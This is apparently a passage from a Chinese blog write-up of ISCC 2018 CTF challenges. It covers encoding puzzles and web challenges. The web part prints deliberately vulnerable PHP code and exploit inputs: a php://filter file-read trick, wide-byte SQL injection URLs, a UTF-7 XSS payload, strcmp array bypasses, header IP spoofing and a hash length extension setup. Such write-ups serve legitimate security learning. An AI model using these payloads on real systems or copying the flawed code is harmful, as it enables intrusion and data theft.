src="/image/ISCC-2018/MISC3.png" alt=""></p><p>调整画布大小，开始摆，得出一张二维码。<code>flag{a332b700-3621-11e7-a53b-6807154a58cf}</code></p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>附件地址：<a href="https://pan.baidu.com/s/1j2P-dyMOjONc7fFZrI2PFA" target="_blank" rel="noopener">一只猫的心思</a></p><p>题目：你能读懂它的心思吗？</p><p>使用<code>foremost</code>抽离图片，得到一个doc文件，打开，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密，得到一串16进制字符串，接下来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16进制--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本</span><br></pre></td></tr></table></figure><p>得到<code>F1a9_is_I5cc_ZOl8_G3TP01NT</code></p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>附件地址：<a href="https://pan.baidu.com/s/1TB3VVjeqYuNd4khsPHgntQ" target="_blank" rel="noopener">暴力XX不可取</a></p><p>题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</p><p>下载附件直接能解压，flag.txt的内容为<code>vfppjrnerpbzvat</code>，凯撒解密得出flag为：<code>isccwearecoming</code></p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</span><br></pre></td></tr></table></figure><p>一直<code>base64</code>解码，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=</span><br></pre></td></tr></table></figure><p>以<code>U2FsdGVkX1</code>开头的密文是<code>AES加密</code>，，然后使用<code>openssl</code>进行解密，顺带猜密码，最后在<a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">encrypt</a>解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</span><br></pre></td></tr></table></figure><p>到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>进行解密得出flag为：<code>把我复制走</code></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</p><p>这个比较明显，就是取凯撒的13行，也就是<code>rot13</code>，结果是<code>roqtp697t95j3</code>，再进行键盘密码解密，得到flag为：<code>yougotme</code>，唯一的小坑就是对这个键盘密码的时候。</p><p><img src="/image/ISCC-2018/MISC7.png" alt=""></p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>附件地址<a href="https://pan.baidu.com/s/1SyD5RrVKI_fJFyrUymbSFw" target="_blank" rel="noopener">有趣的ISCC</a></p><p>题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</p><p>查看图片信息，最末尾发现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.9.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.4.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.5.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.9.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.3.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.1.0.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.1.0.0.;</span><br></pre></td></tr></table></figure><p>处理<a href="http://tool.oschina.net/encode" target="_blank" rel="noopener">还原</a>，得出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d</span><br></pre></td></tr></table></figure><p>再<a href="http://tool.oschina.net/encode?type=3" target="_blank" rel="noopener">还原</a>就成了<code>flag{iscc is fun}</code></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</p><p>16进制转个文本就行。</p><h3 id="挖宝计划"><a href="#挖宝计划" class="headerlink" title="挖宝计划"></a>挖宝计划</h3><p>题目附件：<a href="https://pan.baidu.com/s/1jK1onC1UwpXs3vQLZW8lzg" target="_blank" rel="noopener">挖宝计划</a></p><p>题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？</p><p>去年没解出来的数据分析题目。</p><p>查看zip的内容，发现是有解压密码的，但是不知道是什么，发现<code>zip</code>内也有一个<code>getFlag.py</code>，大小及<code>CRC值</code>一致，所以推断是存在明文攻击的解压漏洞。</p><p><img src="/image/ISCC-2018/MISC10.png" alt=""></p><p>但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;以文找文&quot;（寻&quot;文&quot;启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题</span><br></pre></td></tr></table></figure><p>降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。</p><h3 id="嵌套ZIPs"><a href="#嵌套ZIPs" class="headerlink" title="嵌套ZIPs"></a>嵌套ZIPs</h3><p>题目附件：<a href="https://pan.baidu.com/s/1VnYJc8JyfYlqDWmI2YZ1Ww" target="_blank" rel="noopener">嵌套ZIPs</a></p><p>题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？</p><p>看到<code>ZIPs</code>感觉就是一直要爆破的节奏。没什么思路那就爆破了。</p><p><img src="/image/ISCC-2018/MISC11.png" alt=""></p><p>解出来，又是明文攻击</p><p>ISCC_!S_my_favor1te_CTF</p><h2 id="0x02-Web"><a href="#0x02-Web" class="headerlink" title="0x02 Web"></a>0x02 Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><img src="/image/ISCC-2018/Web1.png" alt=""></p><p>限制了长度为3，将<code>maxlength</code>修改为大于3的值再输入超过3位数的数字即可，比如<code>maxlength=33</code>，输入值为<code>12345</code></p><p>或者直接抓包改值。</p><p><img src="/image/ISCC-2018/Web1-1.png" alt=""></p><p>flag为：<code>768HKyu678567&amp;*&amp;K</code></p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>页面显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Key Words:XSS</span><br><span class="line"></span><br><span class="line">如果你对xss了解的话,那你一定知道key是什么了，加油！</span><br><span class="line"></span><br><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure><p>对其中的base64编码进行解码，得出<code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script</code>，提交<code>/%nsfocusXSStest%/</code>即可得出flag</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>hit:好像有个文件忘记删了</p><p>打开index.php.txt</p><p>发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">die(&quot;flag is here&quot;);</span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">die($_403);</span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">die($_403);</span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要满足3个if才能得到flag，这是个<code>$$</code>导致的变量覆盖问题。题目中使用了两个foreach并且也使用了<code>$$</code>，两个foreach中对<code>$$k</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来。</p><p>但由于第5与第13-14行的代码会将<code>$flag</code>的值给覆盖掉了，所以需要先将<code>$flag</code>的值赋给<code>$_200</code>或<code>$_403</code>，然后利用<code>die($_200)</code>或 <code>die($_403)</code>将flag打印出来。</p><p><img src="/image/ISCC-2018/Web3.png" alt=""></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>hit:没过滤好啊</p><p>这个题目，最开始以为是注入题，毕竟这个题目这个显示。</p><p><img src="/image/ISCC-2018/Web4.png" alt=""></p><p>尝试了<code>id</code>的注入点，最后在尝试修改<code>f参数</code>为<code>index.php</code>，发现带有php参数的显示了 <code>error...</code>，最后的尝试</p><p><img src="/image/ISCC-2018/Web4-1.png" alt=""></p><p><code>index.php</code>的源码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span><br><span class="line">    if(isset($_GET[&apos;f&apos;]))&#123;</span><br><span class="line">        if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</span><br><span class="line">            die(&quot;error...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            include($_GET[&apos;f&apos;] . &apos;.php&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>原来如此，怪不得带有php的都报错了。</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>打开链接显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误！你的IP不是本机ip！</span><br></pre></td></tr></table></figure><p>应该就是伪造IP了。尝试各种伪造IP的http头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web5.png" alt=""></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</p><p>右键源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.</span><br><span class="line">echo file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>访问<code>index.php.txt</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">$b = g;</span><br><span class="line">print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else </span><br><span class="line">print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过即可<code>username[]=&amp;password=9e9</code></p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>题目：随意开火</p><p>查看图片，观察URL为<code>/show.php?img=1.jpg</code>。已经没有别的页面了，估计就是文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=show.php # File not found.</span><br><span class="line">不正常。。。。</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问</span><br><span class="line">?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=show.php # 正常访问</span><br></pre></td></tr></table></figure><p>有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在<code>../flag.php</code>找到flag</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>题目：我都过滤了，看你怎么绕。</p><p>题目地址：<a href="http://118.190.152.202:8018/" target="_blank" rel="noopener">http://118.190.152.202:8018</a></p><p>直接访问<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="noopener">http://118.190.152.202:8018/flag.txt</a>  就出现flag了。</p><p>正确解法是</p><p><img src="/image/ISCC-2018/Web9.png" alt=""></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>扫描扫到<code>/admins</code>，访问直接下载，打开发现是数据库链接信息，内部含有flag。</p><p>正确解法：宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8015/index.php?id=1%df%27</span><br><span class="line">http://118.190.152.202:8015/index.php?id=1%df%27%20and%201=1%20--+</span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web10.png" alt=""></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>想都不想，直接<code>/password[]=flag</code></p><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>题目：那么长的秘钥，要爆破到什么时候啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>hash长度扩展攻击</p><ul><li><code>$key</code>变量我们是不知道的，但是从<code>len</code>值中能获取到长度为<code>46</code></li><li>从<code>verify</code>中得到<code>md5($key.guest)</code>的值为：<code>78cfc57d983b4a17e55828c001a3e781</code></li><li>成功登陆条件：<code>username=guestxxxxxxxxadmin</code>，并且<code>verify</code>要等于<code>md5($key.uaername)</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 